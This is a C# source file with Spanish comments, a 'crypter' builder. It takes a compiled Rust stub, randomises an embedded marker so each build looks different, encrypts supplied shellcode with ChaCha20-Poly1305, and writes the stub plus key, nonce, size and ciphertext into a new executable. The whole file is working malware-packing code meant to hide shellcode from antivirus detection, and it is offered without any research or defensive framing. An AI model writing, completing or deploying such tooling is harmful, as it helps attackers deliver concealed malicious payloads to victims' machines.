using System;
using System.IO;
using System.Security.Cryptography;
using System.Text;
using Org.BouncyCastle.Crypto.Modes;
using Org.BouncyCastle.Crypto.Parameters;
using Org.BouncyCastle.Security;

public static class CrypterBuilder
{
    public static void BuildPayload(string stubPath, byte[] shellcodeBytes, string outputPath)
    {
        byte[] stubBytes = File.ReadAllBytes(stubPath);

        // 1. Generar nuevo marcador aleatorio (32 bytes)
        byte[] newMarker = new byte[32];
        using (var rng = new RNGCryptoServiceProvider())
        {
            rng.GetBytes(newMarker);
        }

        // 2. Buscar el placeholder original en el stub de Rust
        byte[] placeholder = Encoding.ASCII.GetBytes("___THIS_IS_A_PLACEHOLDER_MARK___");
        int markerOffset = FindPattern(stubBytes, placeholder);

        if (markerOffset == -1)
            throw new Exception("Error: Placeholder no encontrado en el stub compilado.");

        // 3. Sobrescribir el placeholder estático con el nuevo aleatorio
        Buffer.BlockCopy(newMarker, 0, stubBytes, markerOffset, 32);

        // 4. Generar Key (32 bytes) y Nonce (¡12 bytes para ChaCha20Poly1305 estándar!)
        byte[] key = new byte[32];
        byte[] nonce = new byte[12];
        var random = new SecureRandom();
        random.NextBytes(key);
        random.NextBytes(nonce);

        // 5. Encriptar el Shellcode (Constructor simplificado)
        var aead = new ChaCha20Poly1305();
        aead.Init(true, new ParametersWithIV(new KeyParameter(key), nonce));

        byte[] encryptedShellcode = new byte[aead.GetOutputSize(shellcodeBytes.Length)];
        int len = aead.ProcessBytes(shellcodeBytes, 0, shellcodeBytes.Length, encryptedShellcode, 0);
        aead.DoFinal(encryptedShellcode, len);

        // 6. Escribir el ejecutable final (Stub + Marcador + Llave + Nonce + Shellcode)
        using (var fs = new FileStream(outputPath, FileMode.Create, FileAccess.Write))
        {
            fs.Write(stubBytes, 0, stubBytes.Length);
            fs.Write(newMarker, 0, newMarker.Length);
            fs.Write(key, 0, key.Length);
            fs.Write(nonce, 0, nonce.Length);

            // --- CORRECCIÓN: Escribir el tamaño del payload (4 bytes, Little Endian) ---
            byte[] sizeBytes = BitConverter.GetBytes((uint)encryptedShellcode.Length);
            if (!BitConverter.IsLittleEndian) Array.Reverse(sizeBytes); // Asegurar Little Endian
            fs.Write(sizeBytes, 0, sizeBytes.Length);
            // -------------------------------------------------------------------------

            fs.Write(encryptedShellcode, 0, encryptedShellcode.Length);
        }
    }

    private static int FindPattern(byte[] data, byte[] pattern)
    {
        for (int i = 0; i < data.Length - pattern.Length; i++)
        {
            bool found = true;
            for (int j = 0; j < pattern.Length; j++)
            {
                if (data[i + j] != pattern[j])
                {
                    found = false;
                    break;
                }
            }
            if (found) return i;
        }
        return -1;
    }
}